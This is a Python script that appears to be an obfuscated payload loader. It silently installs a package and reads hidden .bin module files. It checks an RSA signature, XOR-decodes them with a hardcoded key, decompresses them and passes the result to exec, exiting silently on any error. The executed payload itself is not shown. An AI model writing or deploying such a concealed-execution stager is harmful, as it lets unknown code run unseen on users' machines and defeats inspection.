#!/usr/bin/env python3
import sys
import base64
import zlib
import marshal
import subprocess
from pathlib import Path
from typing import cast

def ensure(pkg: str) -> None:
    try:
        __import__(pkg)
    except Exception:
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", pkg],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            sys.exit(1)

ensure("cryptography")

from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKey
from cryptography.hazmat.primitives import hashes, serialization

PUB_KEY: bytes = b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtFryIiVkcc2Sn+wTMKgb\nN12PnPwT9ncMIcQa4zAA6+373CkuPFer3jHocqbtOrmNPCkVg3DMBTCyPlVZFFgA\n+LtFPtkqlzpxWVBBPOh0r4zsHtrJNe2pmt+I4C9SHiqSgWehoIELoNzbxKjhgjic\nwpCxFfW/saZ0OB6XsiMOsi1FvWhHzIBEiknAzVpO1AaL+zf2sxdBYJ2jti6NVqd8\nRMoLyOMEFsByJBL/hLs49Y79ipTFOIFCRm9jUFKXMHTTWAWvLF2X6oEwclvPyhDF\nOIaNiZCyp6Jj640WTD5njw8Ed9FD1SFyxwQY3bkRJ0TYi6fpk1N/JIOAfvJFbvWd\nswIDAQAB\n-----END PUBLIC KEY-----\n'
SYM_KEY: bytes = base64.b64decode("1BALZaJVq6ideNcAi+QOmIOM8IDMM6HEJeVI35KTMK0=")

def xor(data: bytes) -> bytes:
    k = len(SYM_KEY)
    return bytes(b ^ SYM_KEY[i % k] for i, b in enumerate(data))

try:
    base = Path(getattr(sys, "_MEIPASS", Path(__file__).parent))
    mods = base / "modules"
    files = sorted(mods.glob("p*.bin"))
    if not files:
        sys.exit(1)

    blob = b"".join(p.read_bytes() for p in files)
    if b"." not in blob:
        sys.exit(1)

    sig_b64, enc = blob.split(b".", 1)

    pub = cast(RSAPublicKey, serialization.load_pem_public_key(PUB_KEY))
    pub.verify(
        base64.b64decode(sig_b64),
        enc,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )

    data = zlib.decompress(xor(base64.b64decode(enc)))

    try:
        code = marshal.loads(data)
    except Exception:
        text = data.decode("utf-8")
        if "\x00" in text:
            sys.exit(1)
        code = compile(text, "<run>", "exec")

    exec(code, {"__name__": "__main__"})

except Exception:
    sys.exit(1)
